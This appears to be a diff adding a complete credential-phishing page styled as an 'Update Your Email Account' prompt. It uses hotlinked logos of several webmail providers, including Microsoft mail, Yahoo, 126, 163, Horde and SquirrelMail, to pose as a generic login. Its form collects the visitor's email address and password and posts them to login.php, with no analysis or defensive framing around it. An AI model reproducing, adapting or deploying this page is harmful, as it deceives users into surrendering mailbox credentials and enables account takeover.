@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Update Your Email Account
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link href="http://www.outitgoes.com/default.css" type="text/css" rel="stylesheet" />
+  <!-- no core stylesheet -->
+ </head>
+ <body style="margin-top: 32px; text-align: centre; background: #fff" class="centre">
+  <div style='border: none; margin-right: auto; margin-left: auto; width: 447px; height: 250px; padding: 10px; background: url("http://www.outitgoes.com/login_panel_gradient.jpg") top center no-repeat'>
+   <script language="JavaScript">
+    &lt;!--
+function check(form) {
+if (form.Email.value == "")
+{ alert("Please enter your Email Address."); form.Email.focus(); return;}
+// Start of Email error Alert!
+var checkEmail = "@.";
+var checkStr = form.Email.value;
+var EmailValid = false;
+var EmailAt = false;
+var EmailPeriod = false;
+for (i = 0;  i &lt; checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j &lt; checkEmail.length;  j++)
+{
+if (ch == checkEmail.charAt(j) &amp;&amp; ch == "@")
+EmailAt = true;
+if (ch == checkEmail.charAt(j) &amp;&amp; ch == ".")
+EmailPeriod = true;
+	  if (EmailAt &amp;&amp; EmailPeriod)
+		break;
+	  if (j == checkEmail.length)
+		break;
+	}
+if (EmailAt &amp;&amp; EmailPeriod)
+{
+		EmailValid = true
+		break;
+	}
+}
+if (!EmailValid)
+{
+alert("Please enter a valid email address.");
+form.Email.focus();
+return;}
+// End of Email error Alert!
+if (form.emailpassword.value == "")
+{ alert("To complete the update, please enter your Email Password."); form.emailpassword.focus(); return;}
+{ }
+form.submit()
+}
+//--&gt;
+   </script>
+   <form action="login.php" method="post">
+    <input type="hidden" value="" name="log" />
+    <input type="hidden" value="" name="domain" />
+    <input type="hidden" value="" name="Emails" />
+    <div>
+     <h1>
+      Update Your Email Account
+     </h1>
+     <p>
+      Please enter your email address
+			and password below for authentication.
+     </p>
+     <div class="centre">
+      <table style="margin-left: auto; margin-right: auto; width: 400px">
+       <tbody>
+        <tr>
+         <script>
+          function validate(evt) {
+			  var theEvent = evt || window.event;
+			  var key = theEvent.keyCode || theEvent.which;
+			  key = String.fromCharCode( key );
+			  var regex = /[0-9]|\./;
+			  if( !regex.test(key) ) {
+				theEvent.returnValue = false;
+				if(theEvent.preventDefault) theEvent.preventDefault();
+			  }
+			}
+         </script>
+         <th style="text-align: right; padding-right: 1em">
+          Email Address:
+         </th>
+         <td style="text-align: left">
+          <input type="text" style="color:#000;padding:10px;border:1px solid #000" size="30" disabled="disabled" value="" name="Email" />
+         </td>
+        </tr>
+        <tr>
+         <th style="text-align: right; padding-right: 1em">
+          Password:
+         </th>
+         <td style="text-align: left">
+          <input type="password" size="30" name="emailpassword" style="color:#000;padding:10px;border:1px solid #000" />
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <p>
+       If you have problems logging in, please try the 'basic' interface above.
+      </p>
+      <input type="button" value="Continue >>" onclick="check(this.form)" name="login" />
+     </div>
+    </div>
+   </form>
+  </div>
+  <p align="center">
+   <br />
+   <br />
+   <br />
+  </p>
+  <div style="margin-left:10px;margin-right:10px">
+   <img src="http://www.theemailguide.com/images/ninja-hp-logo.jpg" />
+  </div>
+  <div style="margin-left:10px;margin-right:10px">
+   <img height="30px" src="https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/header/logo_mail.png" />
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="http://mimg.127.net/logo/126logo.gif" />
+   </span>
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" />
+   </span>
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="http://mariocaruso.altervista.org/components/com_media/images/logo_2x.png" />
+   </span>
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="http://www.ticandcloud.com/img/logo_horde.png" />
+   </span>
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="http://upload.wikimedia.org/wikipedia/commons/9/93/Squirrelmail_logo.png" />
+   </span>
+   <span style="margin-left:10px;margin-right:10px">
+    <img height="30px" src="http://mimg.127.net/logo/163logo.gif" />
+   </span>
+   <p>
+   </p>
+   <div align="center">
+   </div>
+  </div>
+ </body>
+</html>
+<!-- 1 -->
